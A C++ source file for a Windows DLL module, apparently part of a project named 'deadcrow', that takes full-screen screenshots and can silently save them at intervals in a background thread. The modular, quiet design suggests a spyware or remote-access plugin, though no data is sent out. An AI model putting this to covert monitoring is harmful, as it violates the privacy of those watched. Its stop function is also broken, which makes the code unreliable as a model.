#include "screenshot.h"
#include <iostream>
#include <fstream>
#include <chrono>
#include <thread>
#include <gdiplus.h>
#include <filesystem>

#pragma comment(lib, "gdiplus.lib")

namespace fs = std::filesystem;

namespace deadcrow {
namespace modules {

// Klasa pomocnicza do inicjalizacji GDI+
class GdiPlusInitializer {
public:
    GdiPlusInitializer() {
        Gdiplus::GdiplusStartupInput gdiplusStartupInput;
        Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
    }
    
    ~GdiPlusInitializer() {
        Gdiplus::GdiplusShutdown(gdiplusToken);
    }
    
private:
    ULONG_PTR gdiplusToken;
};

// Statyczny inicjalizator GDI+
static GdiPlusInitializer gdiPlusInitializer;

Screenshot::Screenshot() : auto_capturing_(false), capture_thread_(NULL), stop_thread_(false) {
    // Domyślny callback statusu (do konsoli)
    status_callback_ = [](const std::string& status) {
        // W wersji produkcyjnej lepiej wyłączyć logi
        #ifdef _DEBUG
        std::cout << "[SCREENSHOT] " << status << std::endl;
        #endif
    };
    
    // Domyślny callback zrzutów ekranu (nic nie robi)
    capture_callback_ = [](const std::vector<uint8_t>&) {};
}

Screenshot::~Screenshot() {
    // Zatrzymaj automatyczne wykonywanie zrzutów ekranu
    stopAutoCapture();
}

bool Screenshot::captureToFile(const std::string& file_path) {
    reportStatus("Wykonywanie zrzutu ekranu do pliku: " + file_path);
    
    // Wykonaj zrzut ekranu
    HBITMAP bitmap = captureScreen();
    if (bitmap == NULL) {
        reportStatus("Nie udało się wykonać zrzutu ekranu");
        return false;
    }
    
    // Zapisz bitmapę do pliku
    bool result = saveBitmapToFile(bitmap, file_path);
    
    // Zwolnij zasoby
    DeleteObject(bitmap);
    
    if (result) {
        reportStatus("Zrzut ekranu zapisany do pliku: " + file_path);
    } else {
        reportStatus("Nie udało się zapisać zrzutu ekranu do pliku");
    }
    
    return result;
}

std::vector<uint8_t> Screenshot::captureToMemory() {
    reportStatus("Wykonywanie zrzutu ekranu do pamięci");
    
    // Wykonaj zrzut ekranu
    HBITMAP bitmap = captureScreen();
    if (bitmap == NULL) {
        reportStatus("Nie udało się wykonać zrzutu ekranu");
        return {};
    }
    
    // Konwertuj bitmapę do formatu PNG
    std::vector<uint8_t> png_data = bitmapToPng(bitmap);
    
    // Zwolnij zasoby
    DeleteObject(bitmap);
    
    reportStatus("Zrzut ekranu wykonany do pamięci: " + std::to_string(png_data.size()) + " bajtów");
    return png_data;
}

bool Screenshot::startAutoCapture(const std::string& directory, int interval_seconds) {
    if (auto_capturing_) {
        reportStatus("Automatyczne wykonywanie zrzutów ekranu już jest aktywne");
        return false;
    }
    
    reportStatus("Uruchamianie automatycznego wykonywania zrzutów ekranu");
    
    // Sprawdź, czy katalog istnieje
    if (!fs::exists(directory)) {
        // Utwórz katalog
        try {
            fs::create_directories(directory);
        }
        catch (const std::exception& e) {
            reportStatus("Nie udało się utworzyć katalogu: " + std::string(e.what()));
            return false;
        }
    }
    
    // Ustaw flagę aktywności
    auto_capturing_ = true;
    stop_thread_ = false;
    
    // Utwórz strukturę parametrów
    struct ThreadParams {
        Screenshot* screenshot;
        std::string directory;
        int interval_seconds;
    };
    
    ThreadParams* params = new ThreadParams;
    params->screenshot = this;
    params->directory = directory;
    params->interval_seconds = interval_seconds;
    
    // Utwórz wątek
    capture_thread_ = CreateThread(NULL, 0, captureThreadProc, params, 0, NULL);
    if (capture_thread_ == NULL) {
        reportStatus("Nie udało się utworzyć wątku");
        delete params;
        auto_capturing_ = false;
        return false;
    }
    
    reportStatus("Automatyczne wykonywanie zrzutów ekranu uruchomione");
    return true;
}

void Screenshot::stopAutoCapture() {
    if (!auto_capturing_) {
        return;
    }
    
    reportStatus("Zatrzymywanie automatycznego wykonywania zrzutów ekranu");
    
    // Ustaw flagę zatrzymania
    auto_capturing_ = false;
    stop_thread_ = true;
    
    // Poczekaj na zakończenie wątku
    if (capture_thread_ != NULL) {
        WaitForSingleObject(capture_thread_, INFINITE);
        CloseHandle(capture_thread_);
        capture_thread_ = NULL;
    }
    
    reportStatus("Automatyczne wykonywanie zrzutów ekranu zatrzymane");
}

DWORD WINAPI Screenshot::captureThreadProc(LPVOID param) {
    // Pobierz parametry
    struct ThreadParams {
        Screenshot* screenshot;
        std::string directory;
        int interval_seconds;
    };
    
    ThreadParams* params = static_cast<ThreadParams*>(param);
    Screenshot* screenshot = params->screenshot;
    std::string directory = params->directory;
    int interval_seconds = params->interval_seconds;
    
    // Zwolnij pamięć parametrów
    delete params;
    
    while (!screenshot->stop_thread_) {
        // Wykonaj zrzut ekranu
        std::vector<uint8_t> png_data = screenshot->captureToMemory();
        
        if (!png_data.empty()) {
            // Wygeneruj nazwę pliku
            auto now = std::chrono::system_clock::now();
            auto now_time_t = std::chrono::system_clock::to_time_t(now);
            std::tm now_tm;
            localtime_s(&now_tm, &now_time_t);
            
            char timestamp[64];
            strftime(timestamp, sizeof(timestamp), "%Y%m%d_%H%M%S", &now_tm);
            
            std::string file_path = directory + "\\screenshot_" + timestamp + ".png";
            
            // Zapisz do pliku
            std::ofstream file(file_path, std::ios::binary);
            if (file) {
                file.write(reinterpret_cast<const char*>(png_data.data()), png_data.size());
                file.close();
                
                screenshot->reportStatus("Zapisano zrzut ekranu do pliku: " + file_path);
            } else {
                screenshot->reportStatus("Nie udało się zapisać zrzutu ekranu do pliku: " + file_path);
            }
            
            // Wywołaj callback
            if (screenshot->capture_callback_) {
                screenshot->capture_callback_(png_data);
            }
        }
        
        // Poczekaj określony czas
        for (int i = 0; i < interval_seconds && !screenshot->stop_thread_; ++i) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }
    
    return 0;
}

HBITMAP Screenshot::captureScreen() {
    // Pobierz uchwyt do pulpitu
    HDC hScreenDC = GetDC(NULL);
    if (hScreenDC == NULL) {
        reportStatus("Nie udało się pobrać kontekstu urządzenia ekranu");
        return NULL;
    }
    
    // Pobierz wymiary ekranu
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    // Utwórz kompatybilny kontekst urządzenia
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (hMemoryDC == NULL) {
        ReleaseDC(NULL, hScreenDC);
        reportStatus("Nie udało się utworzyć kompatybilnego kontekstu urządzenia");
        return NULL;
    }
    
    // Utwórz kompatybilną bitmapę
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (hBitmap == NULL) {
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        reportStatus("Nie udało się utworzyć kompatybilnej bitmapy");
        return NULL;
    }
    
    // Wybierz bitmapę do kontekstu urządzenia
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    
    // Skopiuj zawartość ekranu do bitmapy
    if (!BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY)) {
        SelectObject(hMemoryDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        reportStatus("Nie udało się skopiować zawartości ekranu");
        return NULL;
    }
    
    // Zwolnij zasoby
    SelectObject(hMemoryDC, hOldBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    
    return hBitmap;
}

std::vector<uint8_t> Screenshot::bitmapToPng(HBITMAP bitmap) {
    // Utwórz strumień pamięci
    IStream* stream = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &stream) != S_OK) {
        reportStatus("Nie udało się utworzyć strumienia pamięci");
        return {};
    }
    
    // Konwertuj bitmapę do formatu PNG
    CLSID pngClsid;
    if (CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &pngClsid) != S_OK) {
        stream->Release();
        reportStatus("Nie udało się pobrać CLSID dla formatu PNG");
        return {};
    }
    
    Gdiplus::Bitmap gdiBitmap(bitmap, NULL);
    if (gdiBitmap.Save(stream, &pngClsid, NULL) != Gdiplus::Ok) {
        stream->Release();
        reportStatus("Nie udało się zapisać bitmapy do strumienia");
        return {};
    }
    
    // Pobierz dane ze strumienia
    HGLOBAL hg = NULL;
    if (GetHGlobalFromStream(stream, &hg) != S_OK) {
        stream->Release();
        reportStatus("Nie udało się pobrać danych ze strumienia");
        return {};
    }
    
    // Zablokuj pamięć globalną
    void* data = GlobalLock(hg);
    if (data == NULL) {
        stream->Release();
        reportStatus("Nie udało się zablokować pamięci globalnej");
        return {};
    }
    
    // Pobierz rozmiar danych
    STATSTG stat;
    if (stream->Stat(&stat, STATFLAG_NONAME) != S_OK) {
        GlobalUnlock(hg);
        stream->Release();
        reportStatus("Nie udało się pobrać rozmiaru danych");
        return {};
    }
    
    // Skopiuj dane do wektora
    std::vector<uint8_t> png_data(static_cast<uint8_t*>(data), static_cast<uint8_t*>(data) + stat.cbSize.QuadPart);
    
    // Zwolnij zasoby
    GlobalUnlock(hg);
    stream->Release();
    
    return png_data;
}

bool Screenshot::saveBitmapToFile(HBITMAP bitmap, const std::string& file_path) {
    // Konwertuj bitmapę do formatu PNG
    std::vector<uint8_t> png_data = bitmapToPng(bitmap);
    if (png_data.empty()) {
        return false;
    }
    
    // Zapisz dane do pliku
    std::ofstream file(file_path, std::ios::binary);
    if (!file) {
        reportStatus("Nie udało się otworzyć pliku do zapisu");
        return false;
    }
    
    file.write(reinterpret_cast<const char*>(png_data.data()), png_data.size());
    file.close();
    
    return true;
}

void Screenshot::setStatusCallback(std::function<void(const std::string&)> callback) {
    status_callback_ = callback;
}

void Screenshot::setCaptureCallback(std::function<void(const std::vector<uint8_t>&)> callback) {
    capture_callback_ = callback;
}

bool Screenshot::isAutoCapturing() const {
    return auto_capturing_;
}

void Screenshot::reportStatus(const std::string& status) {
    if (status_callback_) {
        status_callback_(status);
    }
}

BOOL WINAPI Screenshot::DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Inicjalizacja DLL
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            // Czyszczenie przy wyładowaniu DLL
            break;
    }
    
    return TRUE;
}

// Implementacja funkcji eksportowanych

extern "C" __declspec(dllexport) bool CaptureScreenshot(const char* file_path) {
    try {
        Screenshot screenshot;
        return screenshot.captureToFile(file_path);
    }
    catch (const std::exception& e) {
        return false;
    }
}

extern "C" __declspec(dllexport) bool StartAutoCapture(const char* directory, int interval_seconds) {
    try {
        static Screenshot* screenshot = new Screenshot();
        return screenshot->startAutoCapture(directory, interval_seconds);
    }
    catch (const std::exception& e) {
        return false;
    }
}

extern "C" __declspec(dllexport) void StopAutoCapture() {
    try {
        static Screenshot* screenshot = new Screenshot();
        screenshot->stopAutoCapture();
    }
    catch (const std::exception& e) {
        // Ignoruj błędy
    }
}

} // namespace modules
} // namespace deadcrow
